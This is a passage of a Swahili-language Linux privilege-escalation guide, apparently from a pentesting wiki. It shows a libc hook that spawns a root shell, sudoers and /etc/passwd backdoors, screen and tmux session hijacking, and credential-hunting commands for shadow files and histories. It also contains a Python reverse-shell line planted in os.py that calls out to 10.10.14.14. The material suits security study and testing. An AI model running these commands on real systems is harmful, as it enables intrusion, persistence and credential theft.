#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Uwezo

Linux capabilities hutoa **sehemu ndogo ya ruhusa za root zinazopatikana kwa process**. Hii hugawa **ruhusa za root katika vitengo vidogo na tofauti**. Kila kimoja cha vitengo hivi kinaweza kisha kupewa process kivyake. Kwa njia hii seti kamili ya ruhusa hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit ya "execute"** inamaanisha kuwa mtumiaji anayehusika anaweza kutumia "**cd**" kuingia kwenye folda.\
Bit ya **"read"** inamaanisha mtumiaji anaweza **kuorodhesha** **faili**, na bit ya **"write"** inamaanisha mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) ni tabaka la pili la ruhusa za hiari, zinazoweza **kubatilisha ruhusa za kawaida za ugo/rwx**. Ruhusa hizi huongeza udhibiti wa ufikiaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji mahususi ambao si wamiliki au sehemu ya kikundi. Kiwango hiki cha **maelezo ya kina huhakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanapatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Mpe** mtumiaji "kali" ruhusa za kusoma na kuandika faili:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pata** faili zenye ACL maalum kutoka kwenye mfumo:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ya ACL iliyofichwa kwenye sudoers drop-ins

Usanidi usio sahihi unaojirudia ni faili inayomilikiwa na root katika `/etc/sudoers.d/` lenye mode `440` ambalo bado linampa mtumiaji wa low-priv ruhusa ya kuandika kupitia ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sheria ya sudo licha ya biti za ruhusa zenye vizuizi:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Hii ni njia ya persistence/privesc yenye athari kubwa kupitia ACL, kwa sababu ni rahisi kuikosa kwenye ukaguzi unaotegemea `ls -l` pekee.

## Vipindi vya shell vilivyo wazi

Ufikiaji wa GNU Screen kati ya watumiaji hutegemea **usanidi na ACL za kipindi kinachoendeshwa**, si toleo lake pekee. [Nyaraka za GNU Screen zinaeleza](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) kwamba lazima ijengwe kwa usaidizi wa watumiaji wengi; `multiuser on` na ruhusa ya `acladd` au `aclchg` inayofaa huruhusu mtumiaji mwingine kujiunga. [Mwongozo pia unahitaji setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) ili kutafuta kipindi kati ya watumiaji. Socket inayoonekana inayomilikiwa na root au binary ya `screen` ya SUID pekee haithibitishi kuwa kuna shell ya root inayoweza kuunganishwa. Thibitisha kuwa kipindi kinachoendelea kina hali ya watumiaji wengi, mtumiaji wa sasa ana ruhusa halisi ya kuingiza amri/kutumia amri, na shell katika kipindi hicho inaendeshwa na mmiliki mwenye upendeleo kabla ya kuchukulia hili kuwa njia ya escalation.

### screen sessions hijacking

**Orodhesha vipindi vya screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Utekaji nyara wa sessions za screen - Mahali pa Socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Unganisha kwenye session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Hili lilikuwa tatizo katika **matoleo ya zamani ya tmux**. Sikuweza kuteka session ya tmux (v2.1) iliyoundwa na root nikiwa mtumiaji asiye na privileges.

**Orodhesha tmux sessions**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Mahali pa socket (baadhi ya mifumo huonyesha moja kama symlink ya nyingine) - kuteka nyara sessions za tmux: tmux -S /tmp/dev sess ls Orodhesha kwa kutumia socket hiyo; unaweza kuanzisha session ya tmux kwenye socket hiyo...](<../../images/image (837).png>)

**Unganisha kwenye session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Angalia **Valentine box kutoka HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Keys zilizozalishwa kwa OpenSSL builds za Debian zilizoathiriwa au derivatives zake, katika kipindi cha kihistoria cha udhaifu, zinaweza kuwa na randomness inayotabirika; distribution ya sasa ya host au toleo la OpenSSL lililowekewa patch haliwezi kuthibitisha jinsi key ya zamani ilivyozalishwa. Kagua **key husika** dhidi ya blacklist inayofaa ya kihistoria na chanzo chake. Mwongozo wa [`ssh-vulnkey` wa Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) unaeleza jinsi ya kukagua public keys na `authorized_keys`, na [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) inarekodi marekebisho ya OpenSSL. Ingizo kwenye `authorized_keys` ya akaunti yenye privileged ni kidokezo cha privilege escalation tu ikiwa private key inayolingana inaweza kupatikana na sera ya SSH inayotumika bado inakubali key hiyo kwa akaunti hiyo; **host key** dhaifu yenyewe si credential ya kuingia. Badilisha keys zilizoathiriwa na uondoe idhini zake za zamani.

### SSH Interesting configuration values

- **PasswordAuthentication:** Hubainisha kama password authentication inaruhusiwa. Chaguo-msingi la OpenSSH ya upstream ni `yes`; usanidi wa distribution unaweza kulibadilisha.
- **PubkeyAuthentication:** Hubainisha kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, hubainisha kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Chaguo-msingi ni `no`.

### Login control files

Files hizi huathiri nani anaweza kuingia na jinsi gani:

- **`/etc/nologin`**: ikiwa ipo, huzuia login za watumiaji wasio root na kuonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia mahali ambapo root anaweza kuingia (orodha ya TTY zinazoruhusiwa).
- **`/etc/motd`**: bango linaloonyeshwa baada ya login (linaweza kuvuja maelezo ya mazingira au matengenezo).

### PermitRootLogin

Hubainisha kama root anaweza kuingia kwa kutumia ssh. Chaguo-msingi la OpenSSH ya upstream ni `prohibit-password`; usanidi wa distribution unaweza kulibadilisha. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia kwa kutumia private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa kutumia private key pekee, na ikiwa chaguo za commands zimebainishwa
- `no` : hapana

### Trusted SSH user certificate authorities

`TrustedUserCAKeys` hubainisha public keys ambazo sshd inaziamini kusaini certificates za **user**. Ikiwa private CA key inayolingana inaweza kusomwa na mtumiaji mwenye privileges za chini, kagua nani anaweza kupata certificate na ni principals zipi za akaunti inaweza kuthibitisha. `AuthorizedPrincipalsFile` au `AuthorizedPrincipalsCommand` zinaweza kuzuia majina yanayokubaliwa; ikiwa hakuna iliyosanidiwa, certificate lazima iwe na jina la akaunti lengwa. `PermitRootLogin prohibit-password` huzuia root authentication kwa password lakini bado inaweza kuruhusu authentication kwa certificate. Njia ya key iliyo wazi peke yake haithibitishi ufikiaji: thibitisha key pair ya public/private, sheria za `Match` zinazotumika, sera ya akaunti, passphrase ya key, kufutwa kwake, na signature algorithms zinazokubaliwa. Usijumuishe bytes za private key kwenye matokeo ya enumeration. Tazama [mwongozo wa usanidi wa OpenSSH server](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key inaweza pia kutumika **bila kusomeka** na mtumiaji wa sasa ikiwa sheria ya privilege delegation inamruhusu mtumiaji huyo kutumia certificate signer isiyo na vizuizi [kama `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) kwa utambulisho wa mmiliki wa key. Linganisha command na arguments zinazoruhusiwa hasa na ufikiaji wa signer account kwenye key, public CA inayoaminiwa na usanidi wa sshd unaotumika, principal inayokubaliwa kwa akaunti lengwa, uhalali wa certificate, na sera ya login ya akaunti hiyo. Command ya signer iliyokabidhiwa au CA file inayoaminika peke yake haithibitishi ufikiaji wa akaunti nyingine; usisaini test certificate wakati wa passive enumeration.

### AuthorizedKeysFile

Hubainisha files zenye public keys zinazoweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa kuwa home directory. **Unaweza kubainisha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home directory ya mtumiaji**. Kwa mfano:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Mipangilio hiyo itaonyesha kwamba ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuwezesha **kutumia SSH keys zako za ndani badala ya kuziacha keys** (bila passphrases!) kwenye server yako. Kwa hiyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye** host **nyingine ukitumia** **key** iliyo kwenye **host yako ya awali**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hivi:

```
Host example.com
  ForwardAgent yes
```

Angalia kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohamia kwenye mashine tofauti, host hiyo itaweza kufikia keys (jambo la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** **chaguo** hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ukigundua kuwa Forward Agent imesanidiwa katika mazingira, soma ukurasa ufuatao kwa kuwa **unaweza kuutumia vibaya ili kuongeza ruhusa**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za Profile

Faili `/etc/profile` na faili zilizo ndani ya `/etc/profile.d/` ni **scripts zinazoendeshwa mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ukiweza **kuandika au kurekebisha mojawapo, unaweza kuongeza ruhusa**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ikiwa script yoyote isiyo ya kawaida ya profile itapatikana, unapaswa kuikagua ili kuona kama ina **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa na majina tofauti au nakala rudufu zinaweza kuwepo. Kwa hivyo, inapendekezwa **uzitafute zote** na **uangalie kama unaweza kuzisoma** ili kuona **kama zina hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Katika baadhi ya hali unaweza kupata **password hashes** ndani ya faili la `/etc/passwd` (au faili linganishi)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza nenosiri kwa mojawapo ya amri zifuatazo.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Kisha ongeza mtumiaji `hacker` na uweke nenosiri lililotengenezwa.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

DOKEZO: Katika mifumo ya BSD, `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`; pia, `/etc/shadow` hubadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye faili fulani ya usanidi wa service?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kubadilisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor yako itatekelezwa Tomcat itakapowashwa tena.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa muhimu: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda usiweze kusoma ya mwisho, lakini jaribu)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Mahali pa Ajabu/Faili Zinazomilikiwa

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Faili zilizorekebishwa katika dakika za hivi karibuni

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Faili za DB za SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Kwa application databases zinazosomeka, kagua majina ya table na column ili kupata usernames na password hashes. Kupata hash, kurejesha password yake, na kuthibitisha kuwa imetumika tena kwa local account ni hatua tofauti; mfuatano wa jumla wa herufi za hexadecimal wenye herufi 32 hautoshi kubaini kuwa ni MD5 au kwamba kuna ufikiaji wa account.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ikiwa historia ya shell inayosomeka ina amri ya `sudo` ikifuatiwa na mstari mfupi unaofanana na nenosiri, kagua mwenyewe mistari inayoizunguka. Nenosiri lililoingizwa kwenye kidokezo cha kawaida cha `sudo` halihifadhiwi kwenye historia ya shell; mstari unaofuata ni ingizo linalowezekana kuingizwa kwa bahati mbaya kwenye shell, si uthibitisho wa nenosiri halali. Alama ya `.sudo_as_admin_successful` hurekodi matumizi ya awali, si idhini ya sasa.

### Faili zilizofichwa

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binaries katika PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Faili za wavuti**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Nakala za chelezo**

Kagua faili zinazosomeka ndani ya saraka za nakala za chelezo, pamoja na faili ambazo **majina** yake yana neno `backup`: archive yenye jina lisiloeleweka au kiendelezi kilichosimbwa bado inaweza kufichua data ya zamani ya programu. Archive iliyosimbwa ni dalili tu ya uwezekano wa kufichuka. Kurejesha password, kukagua yaliyomo, kupata hash ya programu, na kutumia tena password hiyo kwa akaunti ya Unix ni hatua tofauti zinazohitaji kuthibitishwa; hash iliyo ndani ya archive haithibitishi kuwa akaunti inaweza kutumiwa kuingia kwenye mfumo wa ndani.

Nakala za chelezo za mashine pepe zinazosomeka zinahitaji ukaguzi huo huo. Usanidi wa VirtualBox `.vbox` unaweza kutambua picha za diski za `.vdi` zilizounganishwa na kuwa na metadata ya ufunguo wa diski iliyosimbwa; [VirtualBox inaeleza kuwa ufunguo wa data iliyosimbwa huhifadhiwa kwenye usanidi wa VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Usanidi na picha ya diski vyote lazima vipatikane kabla ya kukagua diski nje ya mtandao. Volume ya guest inaweza kuwa na [tabaka lake la usimbaji fiche la LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), linalohitaji ufunguo tofauti. Hata baada ya kusimbua kwa idhini, script au usanidi wa zamani unaweza kuwa na password; thibitisha kuwa kitambulisho hicho bado kinatumika kwa akaunti ya host na kwamba sera yake ya `sudo` inaruhusu kutekeleza amri yenye upendeleo wa juu kabla ya kuita hali hii local escalation. Wakati wa uchunguzi usioingilia mfumo, orodhesha njia na ruhusa bila kunakili, kusimbua, au kuweka picha za diski kama volumes.

Unapokagua archive inayosomeka, orodhesha majina ya vipengee vilivyomo kabla ya kutoa faili zozote: faili zilizofichwa za uthibitishaji, nyenzo za misimbo ya kurejesha akaunti, au funguo za SSH zinaweza kuwepo hata kama nakala zilizopo kwenye mfumo zinakingwa. Majina ya faili yanaonyesha uwezekano tu; thibitisha nyenzo hizo na matumizi tena ya akaunti kando.

Tanguliza **archive zinazosomeka zinazomilikiwa na mtumiaji mwingine** kwenye saraka za nakala za chelezo, hasa archive zinazomilikiwa na root na zinazoweza kufikiwa kupitia uanachama wa group. Archive ya zamani inaweza kuwa na usanidi au siri ya uthibitishaji hata kama nakala iliyopo kwenye mfumo inalindwa. Kwa kiolesura cha ndani cha usimamizi wa nakala za chelezo kama [Backrest](https://garethgeorge.github.io/backrest/), kagua akaunti inayotumiwa na huduma kwa vitendo na iwapo mtumiaji mwenye upendeleo mdogo anaweza kusoma usanidi wake au kuthibitishwa kwenye kiolesura hicho. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) zake na [kiolesura cha amri cha restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) vinaweza kutumia ruhusa za faili na amri za daemon; kusikiliza kwa loopback pekee hakuamui athari. `passwordBcrypt` ya Backrest ni hash ya bcrypt iliyosimbwa kwa base64 katika [msimbo wake wa uthibitishaji](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), si password iliyo wazi. Thibitisha utambulisho wa huduma, vitambulisho vinavyoweza kutumika, na ufikiaji wa mpango au hifadhi husika kabla ya kuchukulia archive au kiolesura kilichofichuka kama mpaka wa upendeleo.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Faili zinazojulikana kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), hutafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), programu ya open source inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani ya Windows, Linux na Mac.

Ikiwa `/etc/guacamole/guacamole.properties` inaweza kusomeka, kagua mipangilio yake ya muunganisho wa database ya `mysql-*`, `postgresql-*`, au `sqlserver-*`. Ikiwa akaunti imeidhinishwa kusoma majedwali ya Guacamole JDBC, `guacamole_connection_parameter` inaweza kuwa na thamani zilizohifadhiwa za SSH za `username`, `password`, `private-key`, au `passphrase`. Anza na connection IDs na majina ya vigezo, kisha kagua safu husika pekee; thamani iliyohifadhiwa inaweza kuwa token inayobadilika au rejeleo la vault badala ya siri inayoweza kutumika tena. Tazama [schema ya Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) na [vigezo vya muunganisho wa SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Kidhibiti cha nywila cha pswm](https://github.com/Julynx/pswm#usage) huhifadhi vault iliyosimbwa kwa njia fiche katika `~/.local/share/pswm/pswm` kwa chaguomsingi. Ikiwa vault ya mtumiaji mwingine inaonekana, kagua umiliki wake na kama akaunti yako inaweza kuisoma kweli. Njia ya vault pekee haifichui taarifa za kuingia; kurejesha nywila yake kuu, kupata nywila ya akaunti inayoweza kutumika tena, na kuthibitisha ruhusa za akaunti hiyo ni hatua tofauti.

[Database chaguomsingi ya Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) ni `~/.passpie/`, yenye keyring ya `.keys` na faili za taarifa za kuingia za `.pass` zilizosimbwa kwa njia fiche ndani ya saraka za makundi. Kuonekana kwa saraka ya database ni kidokezo cha njia pekee: thibitisha ufikiaji wa ufunguo na ingizo husika lililosimbwa kwa njia fiche, passphrase kuu yoyote inayohitajika, na kama taarifa za kuingia zilizorejeshwa ni za akaunti yenye ruhusa zaidi. Passpie pia inaruhusu [njia maalum za database](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), kwa hiyo njia chaguomsingi haijumuishi zote. Uorodheshaji wa kiotomatiki unapaswa kuonyesha metadata bila kusafirisha taarifa za kuingia au kuchapisha nyenzo za ufunguo.

### Logs

Ukiweza kusoma logs, unaweza kupata **taarifa za kuvutia/siri ndani yake**. Kadiri log inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya **audit logs** zilizosanidiwa **vibaya** (zilizo na backdoor?) zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Ili **kusoma logi, kundi** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) litakuwa msaada mkubwa.

### Faili za Shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Utafutaji wa Jumla wa Creds/Regex

Unapaswa pia kutafuta faili zilizo na neno "**password**" kwenye **jina** lake au ndani ya **maudhui**, na pia utafute IP na barua pepe ndani ya logs, au regex za hashes.\
Sitaorodhesha hapa jinsi ya kufanya haya yote, lakini ikiwa ungependa, unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **kutoka wapi** script ya python itaendeshwa na **unaweza kuandika ndani ya** folda hiyo au unaweza **kurekebisha libraries za python**, unaweza kurekebisha library ya OS na kuweka backdoor ndani yake (ikiwa unaweza kuandika kwenye eneo ambalo script ya python itaendeshwa, nakili na ubandike library ya os.py).

Ili **kuweka backdoor kwenye library**, ongeza tu mstari ufuatao mwishoni mwa library ya os.py (badilisha IP na PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate exploitation

Kazi ya `logrotate` yenye privileges inaweza kuunda njia ya kuandika faili kati ya watumiaji, ikiwa inazungusha logi iliyo ndani ya directory ambayo mtumiaji mwenye privileges chache anaweza kubadilisha au kuelekeza kwingine wakati wa mzunguko huo. Logi inayoweza kuandikwa pekee ni dalili tu. Thibitisha sheria halisi inayotumika na maagizo yake ya `create`, `olddir`, na `su`; utambulisho unaotumika wa scheduler; ruhusa za kuandika na kutafuta kwenye parent ya logi; na kama build iliyosakinishwa pamoja na sera vinaruhusu kubadilisha mahali pa kuhifadhi faili. Shell ya baadaye yenye privileges lazima pia ipakie faili iliyotokana na mchakato huo ili uandishi kwenye faili ya startup uweze kusababisha utekelezaji wa amri. Kagua ratiba, sheria, toleo/ufungashaji na metadata ya path bila kuanzisha mzunguko au kujaribu race condition.

> [!TIP]
> Usichukulie `3.18.0` au nambari yoyote ya toleo pekee kama mpaka wa exploitability. [Upstream's change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) inarekodi uimarishaji wa ulinzi wa directory na symlink katika matoleo mengi, na distributions zinaweza kubeba marekebisho hayo kwenye matoleo ya awali. [Upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) inapendekeza kutumia `su` wakati root inazungusha logi kwenye directories zinazodhibitiwa na watumiaji wasio na privileges; thibitisha sheria inayotumika na tabia halisi.

Maelezo zaidi kuhusu vulnerability yanapatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Unaweza kutumia vulnerability hii kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Vulnerability hii inafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hiyo unapogundua kuwa unaweza kubadilisha logi, angalia ni nani anayezisimamia na kama unaweza kuongeza privileges kwa kubadilisha logi hizo na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeleo la vulnerability:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Faili ya `ifcfg-*` ni dalili inayostahili kuchunguzwa ikiwa mtumiaji mwenye privileges chache anaweza kuiunda au kuibadilisha **na** njia ya kuwezesha mtandao yenye privileges itasoma faili hiyo hasa. Thibitisha ruhusa halisi za faili na directory, interface iliyochaguliwa, utekelezaji wa `ifup`/`ifdown` uliosakinishwa, na ni nani anayeziendesha. Faili inayoweza kuandikwa pekee haisababishi utekelezaji. [Red Hat's RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) inaeleza tofauti kati ya network scripts za zamani na NetworkManager: NetworkManager yenyewe haiwashi scripts hizo za zamani. [RHEL 8 documents](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) kuwa `ifup`/`ifdown` zake za kawaida hutumia NetworkManager, ilhali kifurushi cha hiari cha legacy hutoa shell scripts.

